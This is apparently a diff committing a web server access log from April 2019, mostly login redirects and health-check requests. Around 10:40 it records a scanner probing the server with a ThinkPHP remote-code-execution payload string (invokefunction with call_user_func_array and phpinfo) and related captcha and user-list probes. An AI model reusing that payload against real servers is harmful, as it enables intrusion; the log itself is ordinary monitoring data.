@@ -1,0 +1,1432 @@
+Listening on 8080
+welcome: Unable to identify user...redirecting to login
+::ffff:192.91.235.243 - - [10/Apr/2019:06:37:30 +0000] "GET / HTTP/1.1" 302 56 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:192.91.235.243 - - [10/Apr/2019:06:37:31 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:138.16.125.251 - - [10/Apr/2019:06:37:47 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:06:37:53 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:06:37:53 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+::ffff:192.91.235.243 - - [10/Apr/2019:06:38:04 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:192.91.235.243 - - [10/Apr/2019:06:38:06 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:192.91.235.243 - - [10/Apr/2019:06:38:07 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+welcome: Unable to identify user...redirecting to login
+::ffff:138.16.125.251 - - [10/Apr/2019:06:40:52 +0000] "GET / HTTP/1.1" 302 56 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:138.16.125.251 - - [10/Apr/2019:06:40:52 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:138.16.125.251 - - [10/Apr/2019:06:40:58 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:138.16.125.251 - - [10/Apr/2019:06:42:54 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:138.16.125.251 - - [10/Apr/2019:06:42:56 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:138.16.125.251 - - [10/Apr/2019:06:42:57 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:138.16.125.251 - - [10/Apr/2019:06:42:57 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:138.16.125.251 - - [10/Apr/2019:06:42:58 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:138.16.125.251 - - [10/Apr/2019:06:43:00 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:138.16.125.251 - - [10/Apr/2019:06:43:01 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:192.91.235.243 - - [10/Apr/2019:06:47:17 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:192.91.235.243 - - [10/Apr/2019:06:47:19 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+::ffff:192.91.235.243 - - [10/Apr/2019:06:47:20 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:06:51:48 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:06:51:48 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:06:56:11 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:06:56:11 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:07:00:03 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:07:00:03 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [10/Apr/2019:07:12:50 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [10/Apr/2019:07:12:50 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:07:14:03 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:07:14:03 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+::ffff:138.16.125.251 - - [10/Apr/2019:07:14:50 +0000] "GET /login HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:07:18:27 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:07:18:27 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:07:22:18 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:07:22:18 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [10/Apr/2019:07:34:57 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [10/Apr/2019:07:34:57 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:07:36:15 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:07:36:15 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:07:40:43 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:07:40:43 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:07:44:34 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:07:44:34 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:211.206.124.57 - - [10/Apr/2019:07:49:44 +0000] "HEAD / HTTP/1.0" 302 28 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [10/Apr/2019:07:57:03 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [10/Apr/2019:07:57:03 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:07:58:28 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:07:58:28 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:08:02:59 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:08:02:59 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:08:06:50 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:08:06:50 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:08:20:40 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:08:20:40 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:08:25:13 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:08:25:13 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:08:29:06 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:08:29:06 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:08:42:52 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:08:42:52 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:08:47:27 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:08:47:27 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:08:51:23 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:08:51:23 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:09:05:04 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:09:05:04 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:09:09:42 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:09:09:43 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [10/Apr/2019:09:09:43 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [10/Apr/2019:09:09:43 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:09:13:39 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:09:13:39 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.214.175 - - [10/Apr/2019:09:25:30 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.214.175 - - [10/Apr/2019:09:25:30 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:09:27:16 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:09:27:16 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [10/Apr/2019:09:31:55 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [10/Apr/2019:09:31:55 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:09:31:56 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:09:31:56 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:09:35:56 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:09:35:56 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:09:49:28 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:09:49:28 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [10/Apr/2019:09:54:07 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [10/Apr/2019:09:54:07 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:09:54:12 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:09:54:12 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:09:58:14 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:09:58:14 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:170.72.74.163 - - [10/Apr/2019:10:03:36 +0000] "GET / HTTP/1.1" 302 28 "-" "-"
+::ffff:170.72.74.163 - - [10/Apr/2019:10:03:41 +0000] "GET /login HTTP/1.1" 200 7268 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:10:11:40 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:10:11:40 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:10:16:25 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:10:16:25 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:10:20:30 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:10:20:30 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:10:33:52 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:10:33:52 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:10:38:41 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:10:38:41 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+redirecting to login
+::ffff:49.149.33.118 - - [10/Apr/2019:10:40:43 +0000] "GET /TP/public/index.php HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+::ffff:49.149.33.118 - - [10/Apr/2019:10:40:43 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/TP/public/index.php" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+redirecting to login
+::ffff:49.149.33.118 - - [10/Apr/2019:10:40:43 +0000] "GET /TP/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+::ffff:49.149.33.118 - - [10/Apr/2019:10:40:44 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/TP/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+redirecting to login
+::ffff:49.149.33.118 - - [10/Apr/2019:10:40:44 +0000] "POST /TP/public/index.php?s=captcha HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:49.149.33.118 - - [10/Apr/2019:10:40:45 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/TP/public/index.php?s=captcha" "Go-http-client/1.1"
+redirecting to login
+::ffff:49.149.33.118 - - [10/Apr/2019:10:40:45 +0000] "POST /users?page=&size=5 HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+::ffff:49.149.33.118 - - [10/Apr/2019:10:40:46 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/users?page=&size=5" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+welcome: Unable to identify user...redirecting to login
+::ffff:49.149.33.118 - - [10/Apr/2019:10:40:46 +0000] "GET / HTTP/1.1" 302 28 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+::ffff:49.149.33.118 - - [10/Apr/2019:10:40:47 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:10:42:46 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:10:42:46 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:10:56:03 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:10:56:03 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:11:00:56 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:11:00:56 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:11:05:02 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:11:05:02 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:11:18:15 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:11:18:15 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:11:23:11 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:11:23:11 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:11:27:18 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:11:27:18 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:11:40:27 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:11:40:27 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [10/Apr/2019:11:45:08 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [10/Apr/2019:11:45:08 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:11:45:26 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:11:45:26 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:11:49:34 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:11:49:34 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:12:02:38 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:12:02:38 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [10/Apr/2019:12:07:20 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [10/Apr/2019:12:07:20 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:12:07:42 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:12:07:42 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:12:11:50 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:12:11:50 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:12:24:49 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:12:24:49 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:12:29:58 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:12:29:58 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:12:34:07 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:12:34:07 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:12:47:01 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:12:47:01 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:12:52:11 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:12:52:11 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:12:56:23 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:12:56:23 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
